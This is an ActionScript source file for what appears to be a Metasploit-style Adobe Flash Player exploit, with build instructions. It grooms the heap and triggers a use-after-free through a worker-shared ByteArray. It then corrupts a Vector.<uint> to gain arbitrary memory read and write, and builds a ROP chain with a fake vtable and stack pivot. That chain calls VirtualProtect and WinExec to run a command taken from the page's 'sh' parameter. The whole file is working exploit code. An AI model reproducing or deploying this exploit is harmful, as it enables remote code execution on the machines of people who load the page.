// Build how to:
// 1. Download the AIRSDK, and use its compiler.
// 2. Download the Flex SDK (4.6)
// 3. Copy the Flex SDK libs (<FLEX_SDK>/framework/libs) to the AIRSDK folder (<AIR_SDK>/framework/libs)
//      (all of them, also, subfolders, specially mx, necessary for the Base64Decoder)
// 4. Build with: mxmlc -o msf.swf Main.as

// It uses original code from @hdarwin89 for exploitation using ba's and vectors 

package
{
    import flash.utils.*
    import flash.display.*
    import flash.system.*
    import mx.utils.Base64Decoder

	public final class Msf extends Sprite {
		
		private var shared_ba:ByteArray = null
		
		private var hole_ba:ByteArray = null;
		private var confuse_length_ba:ByteArray = null;
		private var fake_ba:ByteArray = null;
		private var worker:Worker = null;
		
		private var byte_array_vector:Vector.<Object> = null;
		private var byte_array_vector_length:int;
		
		private var object_vector:Vector.<Object> = null;
		private var object_vector_length:uint;
		
		private var ba:ByteArray
		private var uv:Vector.<uint>
		private var corrupted_uv_index:uint = 0
		private var stack:Vector.<uint> = new Vector.<uint>(0x6400)
		private var payload_space:Vector.<uint> = new Vector.<uint>(0x6400)
		
		private var b64:Base64Decoder = new Base64Decoder();
		private var payload:String = ""
		
		public function Msf()  {
			this.object_vector_length = 5770 * 2
			this.byte_array_vector_length = 510 * 2
			
			b64.decode(LoaderInfo(this.root.loaderInfo).parameters.sh)
			payload = b64.toByteArray().toString();
                        
			this.initialize_worker_and_ba()
			if (!this.trigger())
			{
				return
			}
            
			var index:uint = search_uint_vector(114, 0x40000000)
			if (index == 0xffffffff) {
				return
			}
			
			this.uv = this.object_vector[this.corrupted_uv_index]
			
			// Use the corrupted Vector<uint> to search saved addresses
			var object_vector_pos:uint = search_object_vector()
			var byte_array_object:uint = this.uv[object_vector_pos] - 1
			var main:uint = this.uv[object_vector_pos + 2] - 1
			var stack_object:uint = this.uv[object_vector_pos + 3] - 1
			var payload_space_object:uint = this.uv[object_vector_pos + 4] - 1
			
			// Locate the corrupted Vector<uint> in memory
			// It allows arbitrary address memory read/write
			var ba_address:uint = search_ba_address()
			if (ba_address == 0xffffffff) {
				return
			}
			var uv_address:uint = ba_address + index
			this.uv[0] = uv_address
			
			// Use the corrupted Vector<uint> to disclose arbitrary memory
			var buffer_object:uint = vector_read(byte_array_object + 0x40)
			var buffer:uint = vector_read(buffer_object + 8)
			var stack_address:uint = vector_read(stack_object + 0x18)
			var payload_address:uint = vector_read(payload_space_object + 0x18)
			var vtable:uint = vector_read(main)
			
			// Set the new ByteArray length
			ba.endian = "littleEndian"
			ba.length = 0x500000
			
			// Overwite the ByteArray data pointer and capacity
			var ba_array:uint = buffer_object + 8
			var ba_capacity:uint = buffer_object + 16
			vector_write(ba_array)
			vector_write(ba_capacity, 0xffffffff)
			
			// restoring the corrupted vector length since we don't need it
			// anymore
			this.uv[0] = 0xfeedbabe
			//index = search_uint_vector(0xffffffff, 114)
			index = search_uint_vector(0x40000000, 114)
			if (index == 0xffffffff) {
				return
			}
			
			var flash:uint = base(vtable)
			var winmm:uint = module("winmm.dll", flash)
			var kernel32:uint = module("kernel32.dll", winmm)
			var virtualprotect:uint = procedure("VirtualProtect", kernel32)
			var winexec:uint = procedure("WinExec", kernel32)
			var xchgeaxespret:uint = gadget("c394", 0x0000ffff, flash)
			var xchgeaxesiret:uint = gadget("c396", 0x0000ffff, flash)

			// Continuation of execution
			byte_write(buffer + 0x10, "\xb8", false); byte_write(0, vtable, false) // mov eax, vtable
			byte_write(0, "\xbb", false); byte_write(0, main, false) // mov ebx, main
			byte_write(0, "\x89\x03", false) // mov [ebx], eax
			byte_write(0, "\x87\xf4\xc3", false) // xchg esp, esi # ret

			// Put the payload (command) in memory
			byte_write(payload_address + 8, payload, true); // payload

			// Put the fake vtabe / stack on memory
			byte_write(stack_address + 0x18070, xchgeaxespret) // Initial gadget (stackpivot); from @hdarwin89 sploits, kept for reliability...
			byte_write(stack_address + 0x180a4, xchgeaxespret) // Initial gadget (stackpivot); call    dword ptr [eax+0A4h]
			byte_write(stack_address + 0x18000, xchgeaxesiret) // fake vtable; also address will become stack after stackpivot
			byte_write(0, virtualprotect)

			// VirtualProtect
			byte_write(0, winexec)
			byte_write(0, buffer + 0x10)
			byte_write(0, 0x1000)
			byte_write(0, 0x40)
			byte_write(0, buffer + 0x8) // Writable address (4 bytes)

			// WinExec
			byte_write(0, buffer + 0x10)
			byte_write(0, payload_address + 8)
			byte_write(0)

			byte_write(main, stack_address + 0x18000) // overwrite with fake vtable
						
			toString() // call method in the fake vtable
        }
        
        final private function initialize_worker_and_ba():Boolean{
			this.ba = new ByteArray()
			this.ba.endian = "littleEndian"
			this.ba.length = 1024
			this.ba.writeUnsignedInt(0xdeedbeef)
			this.ba.position = 0
			
			this.shared_ba = new ByteArray()
			this.shared_ba.shareable = true
			this.shared_ba.endian = Endian.LITTLE_ENDIAN
			this.shared_ba.writeUnsignedInt(252536)
			this.shared_ba.writeUnsignedInt(16777216)

			this.confuse_length_ba = new ByteArray()
			this.confuse_length_ba.length = 0x2000
			this.confuse_length_ba.endian = Endian.LITTLE_ENDIAN
			this.fill_byte_array(this.confuse_length_ba, 0xAAAAAAAA)

			this.fake_ba = new ByteArray();
			this.fake_ba.endian = Endian.LITTLE_ENDIAN;

			this.worker = WorkerDomain.current.createWorker(loaderInfo.bytes);
			return true;
        }

        final private function trigger():Boolean{
			// Memory massaging
			// 1. Create ByteArray's of 0x2000 lenght and mark one of them (hole_ba)
			this.fill_byte_array_vector();
			// 2. Clear the marked ByteArray
			this.hole_ba.clear(); 

			// The shared_ba should be left in "shared" state
			this.worker.setSharedProperty("fnfre", this.shared_ba)
			this.worker.setSharedProperty("vfhrth", this.confuse_length_ba)
			this.worker.setSharedProperty("vfhrth", this.shared_ba)

			// fake_ba *data* is going to fill the space freed from the hole
			this.fake_ba.length = 0x2000;
			this.fill_byte_array(this.fake_ba, 0xBBBBBBBB);

			// Trigger the vulnerability, if the memory layout is good enough 
			// the (freed) hole_ba metadata will end being the shared_ba metadata...
			this.shared_ba.uncompress()

			// So its size should be 0x2000
			if (this.shared_ba.length != 0x2000)
			{
				return false
			}

			// Free the fake_ba and make holes on the ByteArray's 
			// allocated on massaging.
			this.free_fake_and_make_holes()

			// Fill the holes and the fake_ba data space with 
			// <uint> vectors
			this.fill_with_vectors()

			// Hopefully the shared_ba metadata, product of the vulnerability
			// at this moment point to the  <uint> vectors in memory =) it means
			// game over.
			var pwn_test:uint;
			this.shared_ba.position = 0;
			pwn_test = this.shared_ba.readUnsignedInt();

			if (pwn_test == 0xBBBBBBBB)
			{
				return false
			}

			return true;
        }
        
		final private function fill_byte_array(local_ba:ByteArray, value:int):void{
			var i:int;
			local_ba.position = 0;
			i = 0;
			while (i < (local_ba.length / 4))
			{
				local_ba.writeInt(value);
				i++;
			};
			local_ba.position = 0;
        }
        
        final private function fill_byte_array_vector():void{
			var i:int;
			var local_ba:ByteArray;
			this.byte_array_vector = new Vector.<Object>(this.byte_array_vector_length)

			i = 0;

			while (i < this.byte_array_vector_length)
			{
				local_ba = new ByteArray();
				this.byte_array_vector[i] = local_ba;
				local_ba.endian = Endian.LITTLE_ENDIAN;
				i++;
			}

			var hole_index:int = this.byte_array_vector_length * 4 / 5;
			if (hole_index % 2 == 0)
			{
				hole_index++;
			}

			for(i = 0; i < this.byte_array_vector_length; i++)
			{
				local_ba =  this.byte_array_vector[i] as ByteArray
				local_ba.length = 0x2000
				this.fill_byte_array(local_ba, 0xCCCCCCCC)
				local_ba.writeInt(0xbabefac0)
				local_ba.writeInt(0xbabefac1)
				local_ba.writeInt(i)
				local_ba.writeInt(0xbabefac3)
				if (i == hole_index)
				{
					this.hole_ba = local_ba;
				}
			}

			return;
		}
        
		final private function free_fake_and_make_holes():void {
			var i:int
			var clear_ba:ByteArray
			var hole_index:int = this.byte_array_vector_length * 4 / 5

			if (hole_index % 2 == 0)
			{
				hole_index++;
		    }
	
		    for (i = 0; i < this.byte_array_vector_length; i++)
			{
				if (i == hole_index) {
					this.fake_ba.clear();
				} else {
					if (i % 2 == 1)
					{
						clear_ba = this.byte_array_vector[i] as ByteArray
						this.fill_byte_array(clear_ba, 0xDDDDDDDD)
						clear_ba.clear()
					}
				}
			}
		    return
		}
        
		final private function fill_with_vectors():void {
			var i:uint;
			var uint_vector:Vector.<uint>;
			var objects:Vector.<Object>;
			this.object_vector = new Vector.<Object>(this.object_vector_length);

			i = 0
			while (i < this.object_vector_length)
			{
				if (i % 2 == 0) {
					this.object_vector[i] = new Vector.<uint>()
				} else {
					this.object_vector[i] = new Vector.<Object>()
				}
				i++
			}

			i = 0
			while (i < this.object_vector_length)
			{
				if (i % 2 == 0) {
					uint_vector = this.object_vector[i] as Vector.<uint>
					uint_vector.length = 114
					uint_vector[0] = 0xfeedbabe
					uint_vector[1] = i
					uint_vector[2] = 0xbabeface
				} else {
					objects = this.object_vector[i] as Vector.<Object>
					objects.length = 114
					objects[0] = this.ba
					objects[1] = i
					objects[2] = this
					objects[3] = this.stack
					objects[4] = this.payload_space
				}
				i++
			}
		}
        
		// Use the corrupted shared_ba to search and corrupt the uint vector
		// Returns the offset to the *length* of the corrupted vector
		private function search_uint_vector(old_length:uint, new_length:uint):uint {
			this.shared_ba.position = 0
			var i:uint = 0
			var length:uint = 0
			var atom:uint = 0
			var mark_one:uint = 0
			var index:uint = 0
			var mark_two:uint = 0
			while (i < 0x2000) {
				length = shared_ba.readUnsignedInt()
				if (length == old_length) {
					atom = shared_ba.readUnsignedInt()
					mark_one = shared_ba.readUnsignedInt()
					index = shared_ba.readUnsignedInt()
					mark_two = shared_ba.readUnsignedInt()
					if (mark_one == 0xfeedbabe && mark_two == 0xbabeface) {
						shared_ba.position = i
						shared_ba.writeUnsignedInt(new_length)
						this.corrupted_uv_index = index
						return i;
					}
					i = i + 16
				}
				i = i + 4
			}
			return 0xffffffff
		}
		
		// Use the corrupted shared_ba to disclose its own address
		private function search_ba_address():uint {
			var address:uint = 0
			this.shared_ba.position = 0x14
			address = shared_ba.readUnsignedInt()
			if (address == 0) {
				address = 0xffffffff
				this.shared_ba.position = 8
				var next:uint = shared_ba.readUnsignedInt()
				var prior:uint = shared_ba.readUnsignedInt()
				if (next - prior == 0x8000) {
					address = prior + 0x4000
				}
			} else {
				address = address - 0x30
			}

			return address
		}
		
		// Use the corrupted uint vector to search an vector with
		// interesting objects for info leaking
		private function search_object_vector():uint {
			var i:uint = 0;
			while (i < 0x4000){
				if (this.uv[i] == 114 && this.uv[i + 2] != 0xfeedbabe) {
					return i + 1;
				}
				i++
			}
			return 0xffffffff
		}
		
		// Methods to use the corrupted uint vector
		
		private function vector_write(addr:uint, value:uint = 0):void
		{
			var pos:uint = 0

			if (addr > this.uv[0]) {
				pos = ((addr - this.uv[0]) / 4) - 2
			} else {
				pos = ((0xffffffff - (this.uv[0] - addr)) / 4) - 1
			}

			this.uv[pos] = value
		}

		private function vector_read(addr:uint):uint
		{
			var pos:uint = 0

			if (addr > this.uv[0]) {
				pos = ((addr - this.uv[0]) / 4) - 2
			} else {
				pos = ((0xffffffff - (this.uv[0] - addr)) / 4) - 1
			}

			return this.uv[pos]
		}
		
		// Methods to use the corrupted byte array for arbitrary reading/writing

		private function byte_write(addr:uint, value:* = 0, zero:Boolean = true):void
		{
			if (addr) ba.position = addr
			if (value is String) {
				for (var i:uint; i < value.length; i++) ba.writeByte(value.charCodeAt(i))
				if (zero) ba.writeByte(0)
			} else ba.writeUnsignedInt(value)
		}

		private function byte_read(addr:uint, type:String = "dword"):uint
		{
			ba.position = addr
			switch(type) {
				case "dword":
					return ba.readUnsignedInt()
				case "word":
					return ba.readUnsignedShort()
				case "byte":
					return ba.readUnsignedByte()
			}
			return 0
		}

		// Methods to search the memory with the corrupted byte array

		private function base(addr:uint):uint
		{
			addr &= 0xffff0000
			while (true) {
				if (byte_read(addr) == 0x00905a4d) return addr
				addr -= 0x10000
			}
			return 0
		}

		private function module(name:String, addr:uint):uint
		{
			var iat:uint = addr + byte_read(addr + byte_read(addr + 0x3c) + 0x80) 
			var i:int = -1
			while (true) {
				var entry:uint = byte_read(iat + (++i) * 0x14 + 12)
				if (!entry) throw new Error("FAIL!");
				ba.position = addr + entry
				var dll_name:String = ba.readUTFBytes(name.length).toUpperCase();
				if (dll_name == name.toUpperCase()) {
					break;
				}
			}
			return base(byte_read(addr + byte_read(iat + i * 0x14 + 16)));
		}

		private function procedure(name:String, addr:uint):uint
		{
			var eat:uint = addr + byte_read(addr + byte_read(addr + 0x3c) + 0x78)
			var numberOfNames:uint = byte_read(eat + 0x18)
			var addressOfFunctions:uint = addr + byte_read(eat + 0x1c)
			var addressOfNames:uint = addr + byte_read(eat + 0x20)
			var addressOfNameOrdinals:uint = addr + byte_read(eat + 0x24)

			for (var i:uint = 0; ; i++) {
				var entry:uint = byte_read(addressOfNames + i * 4)
				ba.position = addr + entry
				if (ba.readUTFBytes(name.length+2).toUpperCase() == name.toUpperCase()) break
			}
			return addr + byte_read(addressOfFunctions + byte_read(addressOfNameOrdinals + i * 2, "word") * 4)
		}

		private function gadget(gadget:String, hint:uint, addr:uint):uint
		{
			var find:uint = 0
			var limit:uint = byte_read(addr + byte_read(addr + 0x3c) + 0x50)
			var value:uint = parseInt(gadget, 16)
			for (var i:uint = 0; i < limit - 4; i++) if (value == (byte_read(addr + i) & hint)) break
			return addr + i
		}		
	}
}